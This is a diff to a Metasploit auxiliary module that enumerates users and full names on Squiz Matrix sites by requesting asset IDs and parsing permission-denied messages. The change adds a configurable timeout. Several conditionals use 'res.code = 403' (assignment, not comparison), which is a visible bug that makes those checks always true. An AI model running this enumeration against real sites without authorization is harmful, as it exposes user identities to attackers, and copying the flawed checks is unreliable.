@@ -40,10 +40,15 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('URI', [true, 'The path to users Squiz Matrix installation', '/']),
-        OptInt.new('ASSETBEGIN',  [ true, "Asset ID to start at", 1]),
-        OptInt.new('ASSETEND',  [ true, "Asset ID to stop at", 100]),
+        OptString.new('URI', [ true, 'The path to users Squiz Matrix installation', '/' ]),
+        OptInt.new('ASSETBEGIN',  [ true, "Asset ID to start at", 1 ]),
+        OptInt.new('ASSETEND',  [ true, "Asset ID to stop at", 100 ]),
+        OptInt.new('TIMEOUT', [ false, "The timeout in seconds waiting for the server response", 20 ])
       ], self.class)
+  end
+
+  def timeout
+    datastore['TIMEOUT'] || 20
   end
 
   def target_url
@@ -85,7 +90,7 @@ class Metasploit3 < Msf::Auxiliary
       res = send_request_cgi({
         'uri'     =>  "#{target_url}?a=#{asset}",
         'method'  => 'GET'
-      }, 20)
+      }, timeout)
 
       if (datastore['VERBOSE'])
         if (res and res.code = 403 and res.body and res.body =~ /You do not have permission to access <i>(\w+)<\/i>/)
@@ -103,13 +108,15 @@ class Metasploit3 < Msf::Auxiliary
         res = send_request_cgi({
           'uri'     =>  "#{target_url}?a=#{tmpasset}",
           'method'  => 'GET'
-        }, 20)
+        }, timeout)
+
         if (res and res.code = 403 and res.body and res.body =~ /You do not have permission to access <i>Inbox<\/i>/)
           tmpasset = asset -2
           res = send_request_cgi({
             'uri'     =>  "#{target_url}?a=#{tmpasset}",
             'method'  => 'GET'
-          }, 20)
+          }, timeout)
+
           print_good("#{target_url}?a=#{asset} - Trying to obtain fullname for Asset ID '#{asset}', '#{user}'")
           if (res and res.code = 403 and res.body and res.body =~ /You do not have permission to access <i>(.*)<\/i>/)
             fullname = $1.strip
